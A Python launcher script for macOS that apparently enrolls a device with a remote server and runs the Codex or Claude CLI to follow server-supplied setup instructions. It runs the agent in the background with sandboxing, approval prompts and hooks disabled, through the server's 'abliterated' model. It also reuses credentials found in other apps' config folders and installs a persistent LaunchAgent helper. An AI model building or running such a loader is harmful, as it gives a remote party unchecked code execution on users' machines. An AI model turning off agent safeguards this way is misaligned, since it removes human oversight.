#!/usr/bin/env python3
"""Start a server-instructed setup agent. No helper installation logic lives here."""
import argparse
import base64
import hashlib
import math
import tempfile
import contextlib
import fcntl
import json
import os
from pathlib import Path
import platform
import re
import shutil
import shlex
import signal
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

SERVER = 'https://ask-gateway.r95426882.workers.dev'
SERVER_ALIASES = {SERVER, 'https://34.14.204.251'}
DEFAULT_STATE = Path.home() / 'Library/Application Support/HelperRunner'
PREFIX = '/api/device/helper-bootstrap/sessions'
EXPECTED_MODEL = 'abliterated-model-large-flash'
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA2/ERubjyRvj4YRr3R2Lp
oQ6/HwARjwr2Y/Jer+7xN9ydjHqn76YjsQA1yJVCZ+CvFWboGyMgaztQFBQhkDpP
xcWJwJ3rZwz5raYgt65evInnBQGkwf6CBx7qcKZGVrr3YGAu55O7k814ApwN+ydF
J/1AJrFi/sBsXoIzn1CTqspXyVV2Udbtz/pqtQS2CHutIzfvNFust/BK9oDHhXUi
Qjlellp24GpVA3WNmLLmY2cHkwqQZGlcU+SSSiHf2atu4L9l1USkvSldpoRUaXA5
8YRE/noaf4xG6qtwSniQboukI7c8ZfX4xvnssyfdr5LxnnzpF96pxwfM4QfVjqMB
OKfDTdAZ65hCGawHPaYzJSpsTvpl0dWQJNTkX9nOu3CYsUHV5g7ML10djRp+Lcwa
aI9QJ3Jed1Rfc/u4sDKGfWnE03NWRkgO/gCFH2PZEt6axAt0caVERtE0AWttHjcw
PwHY3antePP1unT7l0HoPo6uoC2iISmXQaYvzSMlGJSfAgMBAAE=
-----END PUBLIC KEY-----'''
MAX_RESPONSE = 1024 * 1024


def save(path, value):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    temporary = path.with_name(path.name + '.' + uuid.uuid4().hex)
    fd = os.open(temporary, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, 'w') as stream:
        json.dump(value, stream, indent=2)
        stream.flush()
        os.fsync(stream.fileno())
    os.replace(temporary, path)


def read(path):
    return json.loads(Path(path).read_text())


def origin(value):
    parsed = urllib.parse.urlsplit(value)
    if parsed.scheme != 'https' and not (parsed.scheme == 'http' and parsed.hostname in ('localhost', '127.0.0.1', '::1')):
        raise ValueError('Server must use HTTPS (loopback HTTP is allowed for tests)')
    if parsed.username or parsed.password or parsed.query or parsed.fragment or parsed.path not in ('', '/'):
        raise ValueError('Server must be a clean origin')
    return value.rstrip('/')


class APIError(RuntimeError):
    def __init__(self, code):
        self.code = code
        super().__init__('Server returned HTTP ' + str(code))


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def api(config, path, body=None, authenticated=True):
    headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'helper-runner/1.0'}
    if authenticated:
        headers['Authorization'] = 'Bearer ' + config['device_token']
    request = urllib.request.Request(origin(config['server_url']) + path,
                                    None if body is None else json.dumps(body).encode(), headers)
    try:
        with urllib.request.build_opener(NoRedirect()).open(request, timeout=30) as response:
            raw = response.read(MAX_RESPONSE + 1)
            if len(raw) > MAX_RESPONSE:
                raise RuntimeError('Server response exceeds 1 MiB')
            return json.loads(raw)
    except urllib.error.HTTPError as error:
        code = error.code
        error.close()
        raise APIError(code) from None
    except (urllib.error.URLError, TimeoutError):
        raise RuntimeError('Server connection failed') from None


def session_endpoint(identifier):
    try:
        if str(uuid.UUID(identifier)) != identifier:
            raise ValueError()
    except (ValueError, TypeError, AttributeError):
        raise RuntimeError('Invalid server session ID') from None
    return PREFIX + '/' + identifier


def verified_setup(response, now=None):
    """Authenticate server instructions with a pinned offline release-signing key."""
    try:
        envelope = response['signed_setup']
        if not isinstance(envelope, dict) or set(envelope) != {'payload', 'signature'}:
            raise ValueError()
        if any(not isinstance(value, str) or len(value) > MAX_RESPONSE for value in envelope.values()):
            raise ValueError()
        payload = base64.b64decode(envelope['payload'], validate=True)
        signature = base64.b64decode(envelope['signature'], validate=True)
        if not payload or len(payload) > MAX_RESPONSE or len(signature) != 384:
            raise ValueError()
        with tempfile.TemporaryDirectory(prefix='helper-runner-verify-') as temporary:
            folder = Path(temporary)
            (folder / 'public.pem').write_text(PUBLIC_KEY)
            (folder / 'signature').write_bytes(signature)
            (folder / 'payload').write_bytes(payload)
            result = subprocess.run(['/usr/bin/openssl', 'dgst', '-sha256', '-verify', str(folder / 'public.pem'),
                                     '-signature', str(folder / 'signature'), str(folder / 'payload')],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            if result.returncode:
                raise ValueError()
        document = json.loads(payload)
        fields = {'schema', 'revision', 'issued_at', 'expires_at', 'model', 'release',
                  'model_catalog_sha256', 'install_instructions', 'reuse_instructions'}
        if not isinstance(document, dict) or set(document) != fields or document['schema'] != 1:
            raise ValueError()
        now = time.time() if now is None else now
        issued, expires = document['issued_at'], document['expires_at']
        if any(isinstance(v, bool) or not isinstance(v, (int, float)) or not math.isfinite(v) for v in (issued, expires)):
            raise ValueError()
        if issued > now + 60 or expires <= now or expires <= issued:
            raise ValueError()
        if document['model'] != EXPECTED_MODEL or not isinstance(document['revision'], (str, int)):
            raise ValueError()
        if not re.fullmatch('[0-9a-f]{64}', document['model_catalog_sha256']):
            raise ValueError()
        release = document['release']
        if not isinstance(release, dict) or not re.fullmatch('[0-9a-f]{64}', release.get('sha256', '')):
            raise ValueError()
        if any(not isinstance(document[key], str) or not document[key].strip() for key in ('install_instructions', 'reuse_instructions')):
            raise ValueError()
        return document
    except (KeyError, ValueError, TypeError, OSError, subprocess.SubprocessError):
        raise RuntimeError('Server setup signature, model or validity check failed') from None


def validate_settings(settings, document, server, provider):
    allowed = {'attempt', 'model_token', 'expires_at', 'deadline', 'model', 'base_url', 'model_catalog'}
    expected_url = origin(server) + ('/api/model' if provider == 'codex' else '/api/model/anthropic')
    if not isinstance(settings, dict) or set(settings) - allowed or settings.get('base_url') != expected_url or settings.get('model') != EXPECTED_MODEL:
        raise RuntimeError('Server model settings do not match the verified setup')
    catalog = settings.get('model_catalog')
    digest = hashlib.sha256(json.dumps(catalog, sort_keys=True, separators=(',', ':')).encode()).hexdigest()
    if digest != document['model_catalog_sha256']:
        raise RuntimeError('Model catalog does not match the signed setup')
    if type(settings.get('attempt')) is not int or settings['attempt'] not in (1, 2):
        raise RuntimeError('Invalid runner attempt')
    if not isinstance(settings.get('model_token'), str) or not settings['model_token'] or len(settings['model_token']) > 4096:
        raise RuntimeError('Invalid model credential')


def prerequisites(provider):
    if sys.version_info < (3, 10):
        raise RuntimeError('Python 3.10 or newer is required')
    if sys.platform != 'darwin' or platform.machine() != 'arm64':
        raise RuntimeError('This release supports Apple Silicon macOS')
    try:
        import plistlib, ssl, zipfile
    except ImportError:
        raise RuntimeError('This Python installation has broken setup modules; use a working Python 3.10+ interpreter') from None
    binary = shutil.which(provider)
    if not binary:
        raise RuntimeError('Install the selected CLI: ' + provider)
    return str(Path(binary).resolve())


def registration(state, server, label, reuse):
    destination = state / 'device.json'
    if destination.exists():
        config = read(destination)
        if origin(config['server_url']) != server:
            raise RuntimeError('This state directory belongs to another server')
        return config, destination, bool(config.get('bootstrap_reuse_existing'))
    if reuse:
        candidates = [Path.home() / 'Library/Application Support/DeviceAgent/config.json',
                      Path.home() / 'Library/Application Support/DeviceAgent/device.json',
                      Path.home() / 'Library/Caches/ask-runner/device.json']
        for candidate in candidates:
            if not candidate.exists():
                continue
            with contextlib.suppress(KeyError, ValueError, RuntimeError, OSError):
                config = read(candidate)
                prior = origin(config['server_url'])
                if prior != server and not {prior, server} <= SERVER_ALIASES:
                    continue
                config = {**config, 'server_url': server}
                # The server checks whether this existing helper is healthy before reuse.
                api(config, '/api/device/setup/manifest')
                return config, candidate, True
    intent_path = state / 'enrollment-intent.json'
    if not intent_path.exists():
        save(intent_path, {'device_id': str(uuid.uuid4()), 'enrollment_nonce': str(uuid.uuid4())})
    intent = read(intent_path)
    config = {'server_url': server, 'state_dir': str(state)}
    if 'code' not in intent:
        reply = api(config, '/api/admin/enrollments', {'ttl_seconds': 600}, False)
        intent['code'] = reply['code']
        save(intent_path, intent)
    try:
        reply = api(config, '/api/enroll/redeem', {**intent, 'label': label, 'platform': sys.platform}, False)
    except APIError as error:
        if error.code != 401:
            raise
        # An expired unused code can be replaced; retain durable identity and nonce.
        intent['code'] = api(config, '/api/admin/enrollments', {'ttl_seconds': 600}, False)['code']
        save(intent_path, intent)
        reply = api(config, '/api/enroll/redeem', {**intent, 'label': label, 'platform': sys.platform}, False)
    config.update(device_id=reply['device_id'], device_token=reply['device_token'])
    save(destination, config)
    return config, destination, False


def command(provider, binary, directory, settings):
    directory.mkdir(parents=True, exist_ok=True, mode=0o700)
    environment = {k: v for k, v in os.environ.items() if k in (
        'PATH', 'TMPDIR', 'LANG', 'LC_ALL', 'SHELL', 'USER', 'LOGNAME', 'SSL_CERT_FILE', 'SSL_CERT_DIR')}
    environment['HOME'] = str(Path.home())
    model = settings['model']
    if provider == 'codex':
        home = directory / 'codex-home'
        home.mkdir(mode=0o700, exist_ok=True)
        environment.update(CODEX_HOME=str(home), HELPER_RUNNER_MODEL_TOKEN=settings['model_token'])
        values = {'model': model, 'model_provider': 'helper_runner', 'approval_policy': 'never',
                  'sandbox_mode': 'danger-full-access', 'web_search': 'disabled', 'notify': [],
                  'model_reasoning_effort': 'none', 'model_providers.helper_runner.name': 'Helper Runner',
                  'model_providers.helper_runner.base_url': settings['base_url'],
                  'model_providers.helper_runner.env_key': 'HELPER_RUNNER_MODEL_TOKEN',
                  'model_providers.helper_runner.wire_api': 'responses',
                  'model_providers.helper_runner.requires_openai_auth': False,
                  'model_providers.helper_runner.supports_websockets': False}
        if settings.get('model_catalog'):
            catalog = directory / 'models.json'
            save(catalog, settings['model_catalog'])
            values['model_catalog_json'] = str(catalog)
        args = [binary, 'exec', '--json', '--ephemeral', '--skip-git-repo-check', '--ignore-user-config',
                '--sandbox', 'danger-full-access', '-C', str(directory)]
        for feature in ('plugins', 'remote_plugin', 'computer_use', 'browser_use', 'apps', 'hooks', 'multi_agent', 'multi_agent_v2', 'goals'):
            args += ['--disable', feature]
        for key, value in values.items():
            args += ['-c', key + '=' + json.dumps(value)]
        args += ['-']
    else:
        home = directory / 'claude-home'
        home.mkdir(mode=0o700, exist_ok=True)
        environment.update(CLAUDE_CONFIG_DIR=str(home), ANTHROPIC_AUTH_TOKEN=settings['model_token'],
                           ANTHROPIC_BASE_URL=settings['base_url'], ANTHROPIC_MODEL=model,
                           ANTHROPIC_DEFAULT_OPUS_MODEL=model, ANTHROPIC_DEFAULT_SONNET_MODEL=model,
                           ANTHROPIC_DEFAULT_HAIKU_MODEL=model, CLAUDE_CODE_SUBAGENT_MODEL=model,
                           CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC='1', DISABLE_AUTOUPDATER='1',
                           MAX_THINKING_TOKENS='0',
                           CLAUDE_CODE_DISABLE_OFFICIAL_MARKETPLACE_AUTOINSTALL='1')
        mcp = directory / 'mcp.json'
        save(mcp, {'mcpServers': {}})
        args = [binary, '-p', '--bare', '--permission-mode', 'bypassPermissions', '--permission-prompts', 'none',
                '--no-chrome', '--no-session-persistence', '--setting-sources', '', '--strict-mcp-config',
                '--mcp-config', str(mcp), '--settings', '{"disableAllHooks":true,"alwaysThinkingEnabled":false}',
                '--effort', 'low',
                '--tools', 'Bash,Edit,Write,Read,Glob,Grep', '--output-format', 'stream-json', '--verbose', '--model', model]
    return args, environment


def summarize(stream, path, secrets=()):
    # Bounded structured diagnostics; redact credentials before truncating or writing.
    total = 0
    def clean(value):
        if isinstance(value, dict):
            return {k: ('[redacted]' if any(word in k.lower() for word in ('token', 'authorization', 'api_key', 'password')) else clean(v)) for k, v in value.items()}
        if isinstance(value, list):
            return [clean(v) for v in value[:40]]
        if isinstance(value, str):
            for secret in secrets:
                if secret:
                    value = value.replace(secret, '[redacted]')
            value = re.sub(r'(?i)Bearer\s+[^\s\\"\']+', 'Bearer [redacted]', value)
            value = re.sub(r'sk-[A-Za-z0-9_-]{16,}', '[redacted]', value)
            return value[:6000]
        return value
    with path.open('a') as log:
        while True:
            raw = stream.readline(65537)
            if not raw:
                break
            if len(raw) > 65536:
                while raw and not raw.endswith(b'\n'):
                    raw = stream.readline(65537)
                continue
            if total >= 2 * 1024 * 1024:
                continue
            try:
                item = json.loads(raw)
            except ValueError:
                # Non-JSON stderr may contain credential-bearing command fragments.
                item = {'type': 'stderr', 'message': raw.decode('utf-8', errors='replace')}
            line = json.dumps({'time': time.time(), 'event': clean(item)}) + '\n'
            log.write(line)
            log.flush()
            total += len(line)


def stop(process):
    if process.poll() is None:
        with contextlib.suppress(ProcessLookupError):
            os.killpg(process.pid, signal.SIGTERM)
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            with contextlib.suppress(ProcessLookupError):
                os.killpg(process.pid, signal.SIGKILL)
            process.wait(timeout=5)
    # Terminate remaining children even if the CLI leader exited first.
    with contextlib.suppress(ProcessLookupError):
        os.killpg(process.pid, signal.SIGTERM)


def wait_for_runner(process, config, endpoint, timeout=600, interval=5, ready_grace=30):
    """Server verification can finish setup even if the model forgets to exit."""
    deadline = time.monotonic() + timeout
    verified = None
    ready_deadline = None
    while process.poll() is None:
        now = time.monotonic()
        if now >= deadline or (ready_deadline is not None and now >= ready_deadline):
            stop(process)
            break
        if verified is None:
            try:
                status = api(config, endpoint)
                if status.get('status') == 'ready':
                    verified = status
                    ready_deadline = time.monotonic() + ready_grace
            except (RuntimeError, OSError, ValueError):
                pass  # A failed poll cannot prove failure or readiness.
        remaining = min(deadline, ready_deadline if ready_deadline is not None else deadline) - time.monotonic()
        if remaining <= 0:
            continue
        try:
            process.wait(timeout=min(interval, remaining))
        except subprocess.TimeoutExpired:
            pass
    return verified


def worker(state, lock_fd):
    os.fstat(lock_fd)  # Parent passes its live flock; a second start cannot race enrollment.
    receipt_path = state / 'receipt.json'
    receipt = read(receipt_path)
    process = None
    def interrupted(*_):
        raise RuntimeError('Launcher interrupted')
    signal.signal(signal.SIGTERM, interrupted)
    signal.signal(signal.SIGINT, interrupted)
    try:
        config, credential_file, reuse = registration(state, receipt['server_url'], receipt['label'], receipt['reuse'])
        for local_path in (config['state_dir'], str(credential_file), sys.executable, receipt['binary']):
            if not Path(local_path).is_absolute() or any(ord(c) < 32 or ord(c) == 127 for c in local_path):
                raise RuntimeError('Setup context requires valid absolute local paths')
        if not re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9.-]{0,119}', receipt['launchagent_label']):
            raise RuntimeError('Invalid local LaunchAgent label')
        session_path = state / 'session.json'
        if not session_path.exists():
            save(session_path, {'idempotency_key': str(uuid.uuid4())})
        session = read(session_path)
        created = api(config, PREFIX, {'provider': receipt['provider'], 'idempotency_key': session['idempotency_key'],
                   'installation_root': config['state_dir'] if reuse else str(state),
                   'label': receipt['launchagent_label'], 'python': sys.executable,
                   'cli_paths': {receipt['provider']: receipt['binary']},
                   'credential_file': str(credential_file), 'reuse_existing': reuse})
        endpoint = session_endpoint(created['id'])
        session.update(id=created['id'], credential_file=str(credential_file))
        save(session_path, session)
        receipt.update(session_id=session['id'], device_id=config['device_id'])
        for _ in range(2):
            status = api(config, endpoint)
            if status['status'] == 'ready':
                receipt.update(status='ready', message='Server verified helper heartbeats')
                break
            if status.get('attempt', 0) >= 2:
                raise RuntimeError('Both setup attempts were used; inspect server status')
            document = verified_setup(api(config, endpoint + '/instructions'))
            settings = api(config, endpoint + '/attempt', {'previous_runner_stopped': True})
            validate_settings(settings, document, config['server_url'], receipt['provider'])
            directory = state / 'attempts' / str(settings['attempt'])
            args, env = command(receipt['provider'], receipt['binary'], directory, settings)
            context = {'server_url': config['server_url'], 'session_id': session['id'],
                       'installation_root': config['state_dir'] if reuse else str(state),
                       'label': receipt['launchagent_label'], 'python': sys.executable,
                       'cli_paths': {receipt['provider']: receipt['binary']}, 'credential_file': str(credential_file),
                       'release': document['release'], 'model': document['model'], 'reuse_existing': reuse}
            context_file = directory / 'setup-context.json'
            instructions_file = directory / 'setup-instructions.md'
            save(context_file, context)
            instructions_file.write_text(document['reuse_instructions'] if reuse else document['install_instructions'])
            os.chmod(instructions_file, 0o600)
            env['HELPER_RUNNER_CONTEXT'] = str(context_file)
            prompt = ('You are the setup runner. Read the signature-verified server instructions in ' + str(instructions_file) +
                      ' and local context in ' + str(context_file) + '. Follow those instructions only for this setup. '
                      'Do not fetch replacement instructions. Use User-Agent: helper-runner/1.0 for HTTP requests. '
                      'Never print credentials. Check HTTP errors and fix causes rather than blindly polling failures. '
                      'Wait for server readiness before exiting. This attempt has a 10 minute deadline.')
            process = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       cwd=directory, env=env, start_new_session=True, pass_fds=(lock_fd,))
            receipt.update(status='running', attempt=settings['attempt'], runner_pid=process.pid)
            save(receipt_path, receipt)
            log_path = directory / 'events.jsonl'
            log_path.touch(mode=0o600, exist_ok=True)
            reader = threading.Thread(target=summarize, args=(process.stdout, log_path, (config['device_token'], settings['model_token'])), daemon=True)
            reader.start()
            process.stdin.write(prompt.encode())
            process.stdin.close()
            try:
                verified = wait_for_runner(process, config, endpoint)
            finally:
                stop(process)
            reader.join(timeout=5)
            code = process.returncode
            process.stdout.close()
            process = None
            status = verified or api(config, endpoint)
            with contextlib.suppress(RuntimeError):
                api(config, endpoint + '/events', {'attempt': settings['attempt'], 'event': 'exit',
                                                  'message': 'Runner process exited after server verification' if verified else 'Runner process exited', 'exit_code': code})
            if status['status'] == 'ready':
                receipt.update(status='ready', message='Server verified helper heartbeats')
                break
            receipt.update(status='retrying', message='Runner exited before server verification')
            save(receipt_path, receipt)
        else:
            raise RuntimeError('Helper heartbeat verification failed after two attempts')
    except Exception as error:
        # Never persist arbitrary exception messages from CLI/model/network payloads.
        message = str(error) if isinstance(error, RuntimeError) else type(error).__name__
        receipt.update(status='failed', message=message)
        if 'endpoint' in locals():
            failed_attempt = settings['attempt'] if 'settings' in locals() else status.get('attempt', 0) if 'status' in locals() else created.get('attempt', 0)
            with contextlib.suppress(Exception):
                api(config, endpoint + '/events', {'attempt': failed_attempt, 'event': 'failed', 'message': message})
    finally:
        if process is not None:
            stop(process)
        receipt.update(finished_at=time.time())
        receipt.pop('runner_pid', None)
        save(receipt_path, receipt)
        os.close(lock_fd)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('action', nargs='?', choices=('start', 'status', '_run'), default='start')
    parser.add_argument('--provider', choices=('codex', 'claude'), default='codex')
    parser.add_argument('--server-url', default=SERVER)
    parser.add_argument('--state-dir', type=Path, default=DEFAULT_STATE)
    parser.add_argument('--label', default=platform.node())
    parser.add_argument('--launchagent-label', default='com.helper-runner.helper')
    parser.add_argument('--check', action='store_true')
    parser.add_argument('--lock-fd', type=int, help=argparse.SUPPRESS)
    args = parser.parse_args()
    state = args.state_dir.expanduser().resolve()
    if args.check:
        binary = prerequisites(args.provider)
        print(json.dumps({'ok': True, 'provider': args.provider, 'binary': binary}))
        return
    if args.action == 'status':
        if not (state / 'receipt.json').exists():
            print(json.dumps({'status': 'not_started'}))
            return
        receipt = read(state / 'receipt.json')
        if (state / 'session.json').exists():
            session = read(state / 'session.json')
            if session.get('id'):
                try:
                    receipt['server'] = api(read(session['credential_file']), session_endpoint(session['id']))
                except RuntimeError as error:
                    receipt['server_error'] = str(error)
        print(json.dumps(receipt, indent=2))
        return
    if args.action == '_run':
        worker(state, args.lock_fd)
        return
    binary = prerequisites(args.provider)
    server = origin(args.server_url)
    state.mkdir(parents=True, exist_ok=True, mode=0o700)
    os.chmod(state, 0o700)
    fd = os.open(state / 'launcher.lock', os.O_CREAT | os.O_RDWR, 0o600)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        os.close(fd)
        print(json.dumps({'status': 'already_running', 'state_dir': str(state)}))
        return
    if (state / 'receipt.json').exists():
        old = read(state / 'receipt.json')
        if old.get('runner_pid'):
            try:
                os.kill(old['runner_pid'], 0)
            except ProcessLookupError:
                pass
            else:
                os.close(fd)
                raise RuntimeError('Previous runner may still be running; inspect it before retrying')
        if old.get('status') == 'ready':
            session = read(state / 'session.json')
            result = api(read(session['credential_file']), session_endpoint(session['id']))
            if result['status'] == 'ready' and result.get('helper_fresh', False):
                os.close(fd)
                print(json.dumps({'status': 'already_ready', 'state_dir': str(state), 'server': result}))
                return
            raise RuntimeError('Previous setup is no longer ready; inspect server status')
        if old.get('server_url') != server or old.get('provider') != args.provider:
            os.close(fd)
            raise RuntimeError('Use a separate state directory for another server/provider')
    save(state / 'receipt.json', {'status': 'starting', 'provider': args.provider, 'binary': binary,
         'server_url': server, 'label': args.label, 'launchagent_label': args.launchagent_label,
         'reuse': state == DEFAULT_STATE.resolve(), 'started_at': time.time()})
    child = subprocess.Popen([sys.executable, str(Path(__file__).resolve()), '_run', '--state-dir', str(state),
                              '--lock-fd', str(fd)], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL, start_new_session=True, pass_fds=(fd,))
    os.close(fd)
    print(json.dumps({'status': 'started', 'launcher_pid': child.pid, 'state_dir': str(state),
                      'status_command': shlex.join([sys.executable, str(Path(__file__).resolve()), 'status', '--state-dir', str(state)])}))


if __name__ == '__main__':
    try:
        main()
    except (RuntimeError, ValueError, OSError) as error:
        print(json.dumps({'status': 'failed', 'message': str(error)}), file=sys.stderr)
        sys.exit(1)
